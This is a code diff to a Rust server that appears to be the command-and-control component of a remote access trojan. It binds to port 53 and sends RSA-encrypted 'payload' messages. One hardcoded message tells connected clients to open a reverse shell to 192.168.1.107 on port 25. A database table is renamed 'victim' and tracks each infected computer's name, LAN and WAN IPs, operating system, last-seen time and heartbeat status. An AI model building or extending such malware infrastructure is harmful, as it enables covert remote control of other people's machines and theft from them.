@@ -11,7 +11,7 @@ use std::io;
 use serde::{Deserialize, Serialize};
 use rsa::{RsaPublicKey, RsaPrivateKey, pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme};
 use rand::rngs::OsRng;
-use rusqlite::{params, Connection, Result};
+use rusqlite::{params, Connection, Result, NO_PARAMS};
 use std::fs;
 use std::fs::File;
 use rusqlite::NO_PARAMS;
@@ -178,7 +178,7 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
                     user_sender: "Server".to_string(),
                     user_receiver:"user".to_string(),
                     message_type:  "payload".to_string(),
-                    message_content: "reverseshell 192.168.1.41 25".to_string(),
+                    message_content: "reverseshell 192.168.1.107 25".to_string(),
                 };
                 let json_message = serde_json::to_string(&message_to_send).unwrap();
                 let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
@@ -193,7 +193,7 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
 #[tokio::main]
 async fn main() -> io::Result<()> {
     let (chann_snd, mut _chann_rcv)  = broadcast::channel(64);
-    let listener = TcpListener::bind("192.168.1.41:53").await?;
+    let listener = TcpListener::bind("192.168.1.109:53").await?;
     // Generate priv and pub key of server
     let mut rng = OsRng;
     let bits = 2048;
@@ -273,12 +273,18 @@ async fn main() -> io::Result<()> {
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
         
         conn.execute(
-            "CREATE TABLE user (
+            "CREATE TABLE victim (
+            	logo TEXT,
                 id INTEGER PRIMARY KEY,
-                name TEXT,
-                ip TEXT,
-                autre TEXT);",NO_PARAMS,);
-        }
+                computername TEXT,
+                lanip TEXT,
+                wanip TEXT,
+                os TEXT,
+                lastseen TEXT,
+                hbstatus TEXT);",NO_PARAMS,);           
+                
+            }
+        
         let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
         println!("{}, {}",user1.username,user1._addr);
         let socket_ddr: &str = &user1._addr.to_string();
